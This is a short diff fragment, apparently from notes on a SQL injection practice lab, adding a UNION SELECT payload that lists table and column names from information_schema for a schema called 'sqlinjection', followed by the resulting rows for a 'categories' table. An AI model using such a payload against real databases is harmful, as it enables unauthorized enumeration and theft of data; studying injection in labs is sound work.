@@ -1,3 +1,5 @@
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema = 'sqlinjection'
+
 sqlinjection	categories	      id
 sqlinjection	categories	      name
 sqlinjection	categories	      description
